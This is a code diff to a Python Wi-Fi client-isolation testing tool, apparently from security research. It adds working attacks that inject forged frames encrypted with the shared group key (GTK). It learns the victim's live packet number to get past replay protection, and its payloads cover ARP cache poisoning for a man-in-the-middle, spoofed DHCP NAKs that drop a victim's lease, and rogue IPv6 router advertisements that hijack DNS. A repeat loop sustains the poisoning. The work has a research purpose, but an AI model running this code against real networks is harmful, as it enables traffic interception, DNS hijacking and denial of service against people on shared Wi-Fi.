@@ -9,6 +9,10 @@ import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, 
 from datetime import datetime
 from wpaspy import Ctrl
 from libwifi.crypto import encrypt_ccmp
+# Explicit import for the ICMPv6 RA injection test (--c2c-ra-inject) --
+# libwifi's wildcard import almost certainly already re-exports these from
+# scapy.all, but importing them explicitly here removes any doubt.
+from scapy.all import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptRDNSS
 
 # TODO:
 # - Clean up mixed usage of spaces/tabs
@@ -215,6 +219,47 @@ class Monitor(Daemon):
 		#if p is None or not p.haslayer(Dot11):
 		#	log(WARNING, "Injecting frame on monitor iface without Dot11-layer.")
 		self.sock_mon.send(p)
+
+	def learn_group_pn(self, bssid, timeout=5, provoke=None):
+		"""Sniff one group-addressed CCMP frame transmitted by `bssid` and
+		return its 48-bit CCMP packet number (PN), or None if none is seen
+		within `timeout` seconds. Used to inject just above the victim's
+		current GTK replay counter so the forged frame is not dropped.
+
+		`provoke`, if given, is called roughly once per second to stimulate
+		group traffic (e.g. have the still-associated victim send a broadcast
+		so the AP relays it to the group under the GTK) on quiet networks."""
+		if bssid is None:
+			return None
+		bssid = bssid.lower()
+		end_time = time.time() + timeout
+		next_probe = 0.0
+		while time.time() < end_time:
+			if provoke is not None and time.time() >= next_probe:
+				try:
+					provoke()
+				except Exception:
+					pass
+				next_probe = time.time() + 1.0
+			remaining = max(0.0, end_time - time.time())
+			sel = select.select([self.sock_mon], [], [], min(remaining, 0.5))
+			if self.sock_mon not in sel[0]:
+				continue
+			p = self.sock_mon.recv()
+			if p is None or not p.haslayer(Dot11) or not p.haslayer(Dot11CCMP):
+				continue
+			dot11 = p[Dot11]
+			# Group-addressed downlink frame from this BSS: transmitter
+			# (addr2) is the BSSID and the destination (addr1) is a group
+			# address (multicast/broadcast bit set in the first octet).
+			if dot11.addr2 is None or dot11.addr2.lower() != bssid:
+				continue
+			if dot11.addr1 is None or not (int(dot11.addr1.split(":")[0], 16) & 0x01):
+				continue
+			ccmp = p[Dot11CCMP]
+			return (ccmp.PN0 | (ccmp.PN1 << 8) | (ccmp.PN2 << 16) |
+			        (ccmp.PN3 << 24) | (ccmp.PN4 << 32) | (ccmp.PN5 << 40))
+		return None
 
 	def set_gtk(self, gtk):
 	    try:
@@ -634,9 +679,15 @@ class Supplicant(Daemon):
 	        except subprocess.CalledProcessError:
 	            pass
 
-	        subprocess.check_call(["ip", "route", "add", "default", "via", router_ip, "dev", self.nic_iface])
+	        # Use 'onlink' so a gateway outside the client's own subnet still
+	        # works. Large guest / captive-portal networks routinely hand out a
+	        # gateway (e.g. 172.16.0.1) that is not on-link for the client's
+	        # address (e.g. 172.16.87.x/24); without onlink the kernel rejects
+	        # the default route with "Nexthop has invalid gateway".
+	        subprocess.check_call(["ip", "route", "add", "default", "via", router_ip,
+	                               "dev", self.nic_iface, "onlink"])
 
-	        log(STATUS, f"Set {self.nic_iface} => {ip_addr}/{prefix}, gw {router_ip}", color="green")
+	        log(STATUS, f"Set {self.nic_iface} => {ip_addr}/{prefix}, gw {router_ip} (onlink)", color="green")
 	    except Exception as e:
 	        log(WARNING, f"Failed to set static IP on {self.nic_iface}: {e}", color="orange")
 
@@ -796,8 +847,14 @@ class Supplicant(Daemon):
 	def get_gtk(self):
 		return self.wpaspy_command(f"GET gtk")
 
-	def get_gtk_2(self):
-		return self.wpaspy_command(f"GET_GTK")
+	def get_gtk_2(self, can_fail=False):
+		return self.wpaspy_command(f"GET_GTK", can_fail=can_fail)
+
+	def get_igtk(self):
+		# Returns the IGTK (PMF management-frame BIP key, key id 4/5) in the
+		# same "<hex> <idx> <seq>" format as GET_GTK, or a failure string when
+		# PMF is not active / no IGTK was installed.
+		return self.wpaspy_command(f"GET_IGTK", can_fail=True)
 
 
 	def run_ping(self):
@@ -952,6 +1009,8 @@ class Client2Client:
 			log(STATUS, f">>> GTK wrapping ICMP ping is allowed ({identities}).", color="red")
 		elif b"broadcast_reflection" in raw(eth):
 			log(STATUS, f">>> Broadcast Reflection is allowed ({identities}).", color="red")
+		elif b"multicast_reflection" in raw(eth):
+			log(STATUS, f">>> Multicast Reflection is allowed ({identities}).", color="red")
 		elif ARP in eth and eth[ARP].op == 2 and \
 			eth[ARP].psrc == self.sup_victim.routerip and eth[ARP].pdst == self.sup_victim.clientip and \
 			eth[ARP].hwdst == self.sup_victim.mac and eth[ARP].hwsrc == self.sup_attacker.mac:
@@ -1024,6 +1083,27 @@ class Client2Client:
 		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"uplink_steal_test" :
 			log(STATUS, f">>> Uplink port stealing is successful.", color="red")
 
+	def _gtk_pn_state_path(self, bssid):
+		# Per-BSSID file remembering the highest GTK injection PN used, so
+		# repeated --c2c-gtk-inject runs keep climbing past the victim's
+		# advancing replay counter instead of colliding at the same PN.
+		safe = (bssid or "unknown").replace(":", "")
+		return f"/tmp/airsnitch-gtkpn-{safe}.state"
+
+	def _read_pn_state(self, path):
+		try:
+			with open(path) as f:
+				return int(f.read().strip())
+		except Exception:
+			return 0
+
+	def _write_pn_state(self, path, value):
+		try:
+			with open(path, "w") as f:
+				f.write(str(int(value)))
+		except Exception:
+			pass
+
 	def send_c2c_frame(self):
 		# Option one: test forwarding at the IP level. send_eth will add Ethernet header.
 		if self.options.c2c_ip is not None:
@@ -1079,12 +1159,81 @@ class Client2Client:
 			for _ in range(10):
 				self.sup_attacker.send_eth(p)
 
+		elif self.options.c2c_multicast is not None:
+			mcast_mac = self.options.mcast_mac
+			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
+			p = Ether(src=self.sup_attacker.mac, dst=mcast_mac, type=0x0800)/ip/Raw(b"multicast_reflection")
+			log(STATUS, f"Sending Ethernet layer packet from attacker to {mcast_mac}: {repr(p)} (Ethernet destination is the multicast MAC)")
+			for _ in range(10):
+				self.sup_attacker.send_eth(p)
+
+		elif self.options.c2c_ra_inject is not None:
+			# ICMPv6 RA injection: a client on the attacker's (e.g. guest) network
+			# sends a spoofed Router Advertisement -- with an attacker-controlled
+			# RDNSS (recursive DNS server) option -- to the IPv6 all-nodes multicast
+			# address (ff02::1 / Ethernet 33:33:00:00:00:01). If client isolation
+			# does not block it, an isolated victim on a DIFFERENT network/VLAN will
+			# still receive it and may silently swap its IPv6 DNS resolver to the
+			# attacker's chosen server.
+			#
+			# Unlike --c2c-gtk-inject this needs NO monitor mode and NO GTK -- it is
+			# sent as an ordinary frame over the attacker's own normal, already-
+			# encrypted station link (same mechanism as --c2c-broadcast/--c2c-multicast).
+			evil_dns = self.options.ra_inject_dns
+			ra = (Ether(src=self.sup_attacker.mac, dst="33:33:00:00:00:01")
+			      / IPv6(src="fe80::dead:beef", dst="ff02::1")
+			      / ICMPv6ND_RA(chlim=64, routerlifetime=self.options.ra_lifetime,
+			                    M=int(self.options.ra_managed), O=int(self.options.ra_other))
+			      / ICMPv6NDOptSrcLLAddr(lladdr=self.sup_attacker.mac)
+			      / ICMPv6NDOptRDNSS(lifetime=9000, dns=[evil_dns]))
+			log(STATUS, f"Sending spoofed ICMPv6 RA (RDNSS={evil_dns}, M={int(self.options.ra_managed)}, O={int(self.options.ra_other)}, lifetime={self.options.ra_lifetime}): {repr(ra)}")
+			for _ in range(self.options.ra_inject_count):
+				self.sup_attacker.send_eth(ra)
+			log(STATUS, f">>> ICMPv6 RA injected toward ff02::1 with RDNSS={evil_dns}. "
+			            f"Check the victim's resolver ('resolvectl status' / 'ip -6 route') "
+			            f"to confirm whether it adopted the attacker's DNS server.", color="red")
+
 		elif self.options.c2c_gtk_inject is not None:
-			victim_gtk_2 = self.sup_victim.get_gtk_2()
-			attacker_gtk_2 = self.sup_attacker.get_gtk_2()
-			log(STATUS, f">>> The victim's GTK is ({victim_gtk_2}).", color="green")
-			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk_2}).", color="green")
+			victim_gtk_2 = self.sup_victim.get_gtk_2(can_fail=True)
+			attacker_gtk_2 = self.sup_attacker.get_gtk_2(can_fail=True)
+			# No GTK means the network is unencrypted (key_mgmt=NONE, i.e. an
+			# open / captive-portal SSID). There is no group key to inject with,
+			# so --c2c-gtk-inject does not apply. Fail clearly instead of
+			# crashing on the missing key.
+			if not victim_gtk_2 or not attacker_gtk_2:
+				log(ERROR, ">>> GET_GTK returned no key: this looks like an OPEN network "
+				           "(key_mgmt=NONE, e.g. a captive-portal guest SSID) with no GTK. "
+				           "--c2c-gtk-inject needs an encrypted SSID (WPA2/WPA3/OWE). For an open "
+				           "network, test client-to-client reach with the plaintext tests instead: "
+				           "--c2c-broadcast / --c2c-multicast / --c2c-eth / --c2c / --port-steal.")
+				return
+			# wpa_supplicant's GET_GTK/GET_IGTK replies end with a newline;
+			# strip it for display so the closing ")." stays on the same line.
+			log(STATUS, f">>> The victim's GTK is ({victim_gtk_2.strip()}).", color="green")
+			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk_2.strip()}).", color="green")
+			# Also report the IGTK (PMF management-frame key, id 4/5) if present,
+			# purely for confirmation that PMF is active. The data-frame injection
+			# below always uses the data GTK above, never this key.
+			victim_igtk = self.sup_victim.get_igtk()
+			attacker_igtk = self.sup_attacker.get_igtk()
+			if victim_igtk or attacker_igtk:
+				log(STATUS, f">>> PMF active. The victim's IGTK is ({(victim_igtk or '').strip()}).", color="green")
+				log(STATUS, f">>> PMF active. The attacker's IGTK is ({(attacker_igtk or '').strip()}).", color="green")
+			else:
+				log(STATUS, ">>> No IGTK installed (PMF not active on this connection).", color="green")
 			self.sup_attacker.stop()
+			# Tune the monitor/injection interface to the victim's operating
+			# frequency. Otherwise it stays on the interface's power-up default
+			# channel, and frames injected there never reach a victim on a
+			# different channel (e.g. a 5 GHz BSS such as 5220 MHz / ch 44),
+			# which looks like a silent failure (no frames seen by the victim).
+			if getattr(self, "freq_victim", None):
+				self.options.c2m_freq = self.freq_victim
+				log(STATUS, f">>> Tuning injection interface to victim frequency {self.freq_victim} MHz.", color="green")
+			else:
+				log(WARNING, ">>> Victim frequency unknown; monitor interface will stay on its "
+				             "default channel. If the victim is on another channel the injection "
+				             "will not reach it.")
 			self.mon_attacker = Monitor(self.options.c2c_gtk_inject, self.options)
 			self.mon_attacker.start()
 
@@ -1092,6 +1241,20 @@ class Client2Client:
 			gtk = bytes.fromhex(gtk)
 			idx = int(idx)
 			seq = int(seq, 16)
+
+			# Under PMF (e.g. SAE/PFA) the client also installs an IGTK
+			# (key id 4/5, a BIP integrity key). That is NOT a data-frame
+			# key: encrypting an injected CCMP data frame with it is
+			# meaningless and the injection silently fails. Data GTKs use
+			# key ids 1-3, so anything >= 4 means we were handed the IGTK.
+			if idx >= 4:
+				log(ERROR, f">>> GET_GTK returned key id {idx}, which is an IGTK/management "
+				           f"integrity key, not a data GTK. This happens with a wpa_supplicant "
+				           f"build that caches the IGTK over the data GTK under PMF. Rebuild and "
+				           f"reinstall wpa_supplicant with the updated wpas_glue.c (which excludes "
+				           f"BIP/IGTK keys from the GET_GTK cache), then retry --c2c-gtk-inject.")
+				self.mon_attacker.stop()
+				return
 			
 			sn = 10
 
@@ -1108,13 +1271,142 @@ class Client2Client:
 			header.FCfield = "from-DS"
 
 			header.TID = 2
-			seq += 50
-			frame = header/LLC()/SNAP()/IP(src=self.sup_victim.routerip, dst=self.sup_victim.clientip)/ICMP()/Raw(b"icmp_ping_test")
-			frame = encrypt_ccmp(frame, gtk, seq, keyid=idx)
-			log(STATUS, "Injecting frame 5 times: " + repr(frame))
-			# Inject multiple times because broadcast frames don't get acked/retransmitted
-			for i in range(5):
-				self.mon_attacker.inject_mon(frame)
+
+			# Determine the CCMP packet number (PN) for the injected frame.
+			# A receiver drops any group frame whose PN is at or below its
+			# current GTK replay counter, so a stale low PN (such as GET_GTK's
+			# install-time seq, often 0) is silently discarded on a live
+			# network that has been sending broadcast/multicast traffic.
+			# Prefer an explicit --gtk-inject-pn; otherwise learn the current
+			# counter from a real group frame on air and inject just above it;
+			# failing that, fall back to a high PN.
+			# The victim only accepts a group frame whose PN is strictly above
+			# its current GTK replay counter, and our own previous injections
+			# advance that counter -- so re-running with the same PN fails. We
+			# remember the highest PN used (per BSSID) to keep climbing.
+			pn_state = self._gtk_pn_state_path(self.bssid_victim)
+			last_pn = self._read_pn_state(pn_state)
+			explicit_pn = getattr(self.options, "gtk_inject_pn", None)
+			if explicit_pn is not None:
+				seq = explicit_pn
+				log(STATUS, f">>> Using explicit injection PN {seq}.", color="green")
+			else:
+				learn_timeout = getattr(self.options, "gtk_inject_pn_timeout", 8)
+				# Provoke a group frame on quiet networks: have the still-
+				# associated victim broadcast an ARP so the AP relays it to the
+				# group under the GTK, letting us read the live counter. Skipped
+				# with --no-gtk-inject-provoke (e.g. to avoid drawing a competing
+				# legitimate gateway ARP reply, or on networks with group traffic).
+				def _provoke():
+					self.sup_victim.send_eth(Ether(dst="ff:ff:ff:ff:ff:ff", src=self.sup_victim.mac)
+						/ ARP(op="who-has", pdst=self.sup_victim.routerip,
+						      psrc=self.sup_victim.clientip, hwsrc=self.sup_victim.mac))
+				provoke = None if getattr(self.options, "gtk_inject_no_provoke", False) else _provoke
+				learned = self.mon_attacker.learn_group_pn(self.bssid_victim, timeout=learn_timeout, provoke=provoke)
+				if learned is not None:
+					seq = max(learned, last_pn) + 1
+					log(STATUS, f">>> Observed live GTK PN {learned} on air; injecting at PN {seq}.", color="green")
+				else:
+					seq = max(100000, last_pn + 10)
+					log(WARNING, f">>> Could not observe a group frame to learn the GTK PN; using PN {seq} "
+					             f"(auto-incremented across runs). If injection still has no effect, pass a "
+					             f"higher --gtk-inject-pn. Note: a high PN can make the victim drop subsequent "
+					             f"legitimate broadcast frames until the AP's counter catches up.")
+			# Select which L3 payload to wrap in the GTK-encrypted broadcast
+			# frame. All of these are group-addressed downlink (from-DS) frames
+			# the victim accepts as if sent by the AP, so they bypass client
+			# isolation whenever the GTK is shared across clients/identities.
+			payload_kind = getattr(self.options, "gtk_inject_payload", "icmp") or "icmp"
+			attacker_mac = self.sup_attacker.mac
+			victim_mac   = self.sup_victim.mac
+			router_ip    = self.sup_victim.routerip
+			client_ip    = self.sup_victim.clientip
+			router_mac   = self.sup_victim.routermac
+
+			if payload_kind == "arp":
+				# ARP cache poisoning: tell the victim that the gateway IP is at
+				# the attacker's MAC, so the victim starts sending its upstream
+				# traffic to the attacker (MITM). Confirm on the victim with
+				# `ip neigh show <gateway-ip>` -- no reply packet is required.
+				inner = ARP(op="is-at", psrc=router_ip, hwsrc=attacker_mac,
+				            pdst=client_ip, hwdst=victim_mac)
+				# The de-encapsulated Ethernet source (802.11 addr3/SA) is the
+				# attacker so the frame looks like it originated from them.
+				header.addr3 = attacker_mac
+				desc = f"ARP poison ({router_ip} is-at {attacker_mac}: gateway -> attacker)"
+			elif payload_kind == "dhcp-nak":
+				# Spoofed DHCP NAK from the server, forcing the victim to drop
+				# its lease (connectivity DoS). Best-effort: a NAK is normally
+				# only honoured if its XID matches the victim's in-flight
+				# request, which we do not know here -- set it with
+				# --gtk-inject-dhcp-xid if you have captured it.
+				xid = getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0
+				rawmac = bytes.fromhex(victim_mac.replace(":", ""))
+				inner = (IP(src=router_ip, dst="255.255.255.255")
+				         / UDP(sport=67, dport=68)
+				         / BOOTP(op=2, yiaddr="0.0.0.0", siaddr=router_ip,
+				                 chaddr=rawmac, xid=xid)
+				         / DHCP(options=[("message-type", "nak"),
+				                         ("server_id", router_ip), "end"]))
+				header.addr3 = router_mac if router_mac else "ff:ff:ff:ff:ff:ff"
+				desc = f"DHCP NAK (xid={xid}) from {router_ip} -> force victim to drop its lease"
+			elif payload_kind == "ra":
+				# ICMPv6 Router Advertisement with a malicious RDNSS, injected
+				# as a GTK-encrypted group frame to the IPv6 all-nodes multicast
+				# (ff02::1 / 33:33:00:00:00:01). Unlike --c2c-ra-inject (which
+				# sends over the attacker's own station link and can be dropped
+				# by client isolation) this reaches the victim via the shared
+				# GTK. Confirm on the victim with 'resolvectl status'.
+				evil_dns = self.options.ra_inject_dns
+				inner = (IPv6(src="fe80::dead:beef", dst="ff02::1")
+				         / ICMPv6ND_RA(chlim=64, routerlifetime=self.options.ra_lifetime,
+				                       M=int(self.options.ra_managed), O=int(self.options.ra_other))
+				         / ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
+				         / ICMPv6NDOptRDNSS(lifetime=9000, dns=[evil_dns]))
+				header.addr1 = "33:33:00:00:00:01"
+				header.addr3 = attacker_mac
+				desc = f"ICMPv6 RA (RDNSS={evil_dns}, M={int(self.options.ra_managed)}, O={int(self.options.ra_other)}) -> IPv6 DNS hijack"
+			else:
+				# Default, original behaviour: a broadcast ICMP echo request
+				# spoofed as coming from the gateway to the victim.
+				payload_kind = "icmp"
+				inner = IP(src=router_ip, dst=client_ip)/ICMP()/Raw(b"icmp_ping_test")
+				desc = f"ICMP echo request ({router_ip} -> {client_ip})"
+
+			plain = header/LLC()/SNAP()/inner
+			log(STATUS, f">>> GTK-inject payload = {payload_kind}: {desc}", color="red")
+			# Encrypt each copy with a DISTINCT, increasing PN. Re-sending the
+			# same PN is pointless: the receiver accepts the first frame, bumps
+			# its GTK replay counter, and drops every identical repeat as a
+			# CCMP replay. Incrementing the PN gives real redundancy against
+			# over-the-air loss (broadcast frames are not acked/retransmitted).
+			nframes = 5
+			repeat = getattr(self.options, "gtk_inject_repeat", None)
+
+			def _inject_burst(start_pn):
+				for i in range(nframes):
+					frame = encrypt_ccmp(plain.copy(), gtk, start_pn + i, keyid=idx)
+					if i == 0:
+						log(STATUS, f"Injecting {nframes} frames at PN {start_pn}..{start_pn + nframes - 1}: " + repr(frame))
+					self.mon_attacker.inject_mon(frame)
+				# Remember the highest PN used so the next burst/run climbs past
+				# the victim's advancing replay counter.
+				self._write_pn_state(pn_state, start_pn + nframes)
+				return start_pn + nframes
+
+			if repeat is None or repeat <= 0:
+				_inject_burst(seq)
+			else:
+				# Sustained injection: keep re-sending with climbing PNs so the
+				# forged frame stays the most recent (e.g. a persistent ARP MITM)
+				# until interrupted with Ctrl-C.
+				log(STATUS, f">>> Repeating injection every {repeat}s (Ctrl-C to stop).", color="red")
+				try:
+					while True:
+						seq = _inject_burst(seq)
+						time.sleep(repeat)
+				except KeyboardInterrupt:
+					log(STATUS, ">>> Stopped repeated injection.", color="green")
 
 		else:
 			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
@@ -1483,6 +1775,8 @@ def main():
 	parser.add_argument("--c2c-eth", help="Second interface to test client-to-client Ethernet traffic.")
 	parser.add_argument("--c2c-ip", help="Second interface to test client-to-client IP layer traffic.")
 	parser.add_argument("--c2c-broadcast", help="Second interface to test client-to-client Ethernet layer broadcast traffic.")
+	parser.add_argument("--c2c-multicast", help="Second interface to test client-to-client Ethernet layer multicast traffic (analogous to --c2c-broadcast but uses a multicast L2 destination).")
+	parser.add_argument("--mcast-mac", default="01:00:5e:00:00:01", help="Multicast MAC address used as L2 destination in the --c2c-multicast test (default: 01:00:5e:00:00:01 = IPv4 224.0.0.1 all-hosts).")
 	parser.add_argument("--c2m", help="Second interface to test client-to-monitor traffic.")
 	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
 	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
@@ -1495,6 +1789,18 @@ def main():
 	parser.add_argument("--poc", default=False, action="store_true", help="Attack a real client for PoC purposes.")
 	parser.add_argument("--measure", default=False, action="store_true", help="Measure attack performance. ")
 	parser.add_argument("--c2c-gtk-inject", help="Checking if second given interface can inject frames wrapped with GTK.")
+	parser.add_argument("--gtk-inject-payload", default="icmp", choices=["icmp", "arp", "dhcp-nak", "ra"], help="Payload to wrap in the GTK-encrypted broadcast frame for --c2c-gtk-inject: 'icmp' (default, spoofed gateway->victim echo request), 'arp' (poison the victim's ARP cache so the gateway IP maps to the attacker's MAC -> MITM; confirm with 'ip neigh show <gw>' on the victim), 'dhcp-nak' (spoofed DHCP NAK to force the victim to drop its lease), or 'ra' (ICMPv6 Router Advertisement with a malicious RDNSS DNS server -> IPv6 DNS hijack via the shared GTK; tune it with the --ra-* options and confirm with 'resolvectl status' on the victim).")
+	parser.add_argument("--gtk-inject-dhcp-xid", default=0, type=lambda x: int(x, 0), help="Transaction XID for the --gtk-inject-payload dhcp-nak frame (hex or decimal). A NAK is usually only honoured when it matches the victim's in-flight request XID; default 0.")
+	parser.add_argument("--gtk-inject-pn", default=None, type=lambda x: int(x, 0), help="CCMP packet number (PN) to use for the injected --c2c-gtk-inject frame (hex or decimal). The victim drops any group frame whose PN is at or below its current GTK replay counter, so a stale low PN fails on a live network. If omitted, the tool learns the live PN from a real group frame on air and injects just above it (falling back to a high PN). A high PN can make the victim drop subsequent legitimate broadcast frames until the AP's counter catches up.")
+	parser.add_argument("--gtk-inject-pn-timeout", default=8, type=int, help="Seconds to listen for a real group frame (provoked via a victim broadcast) to learn the current GTK PN before injecting (default: 8). Only used when --gtk-inject-pn is not given.")
+	parser.add_argument("--gtk-inject-repeat", default=None, type=float, help="Keep re-injecting the --c2c-gtk-inject payload every N seconds (with climbing PNs) until Ctrl-C, instead of a single burst. Useful to sustain an ARP-poison MITM so the forged frame stays the most recent reply.")
+	parser.add_argument("--no-gtk-inject-provoke", dest="gtk_inject_no_provoke", default=False, action="store_true", help="Do not have the victim broadcast an ARP to provoke a group frame while learning the live GTK PN. Use on networks that already have group traffic, or to avoid drawing a competing legitimate gateway ARP reply during an ARP-poison test.")
+	parser.add_argument("--c2c-ra-inject", help="Second interface to test ICMPv6 Router Advertisement injection: attacker sends a spoofed RA with a malicious RDNSS (DNS server) option toward the victim's network.")
+	parser.add_argument("--ra-inject-dns", default="2001:db8:dead:beef::53", help="Spoofed IPv6 DNS server advertised via the injected RA's RDNSS option.")
+	parser.add_argument("--ra-inject-count", default=5, type=int, help="Number of times to send the spoofed RA (default: 5).")
+	parser.add_argument("--ra-managed", default=False, action="store_true", help="Set the Managed (M) flag on the injected RA -- match this to the real network's RA if it is a stateful (DHCPv6) network, e.g. VLAN201-style setups.")
+	parser.add_argument("--ra-other", default=False, action="store_true", help="Set the Other-config (O) flag on the injected RA -- match this to the real network's RA.")
+	parser.add_argument("--ra-lifetime", default=9000, type=int, help="Router lifetime (seconds) advertised in the injected RA (default: 9000, high to outcompete the real router).")
 	parser.add_argument('--iperf-target', dest='iperf_target', default='192.168.106.157',
                     help='iperf3 server target IP (default: 192.168.106.157)')
 	parser.add_argument('--iperf-bandwidth', dest='iperf_bandwidth', default='100M',
@@ -1530,6 +1836,8 @@ def main():
 	if options.c2c_port_steal_uplink is not None: options.c2c = options.c2c_port_steal_uplink
 	if options.c2c_gtk_inject is not None: options.c2c = options.c2c_gtk_inject
 	if options.c2c_broadcast is not None: options.c2c = options.c2c_broadcast
+	if options.c2c_multicast is not None: options.c2c = options.c2c_multicast
+	if options.c2c_ra_inject is not None: options.c2c = options.c2c_ra_inject
 
 	if options.c2m_ip is not None: options.c2m = options.c2m_ip
 
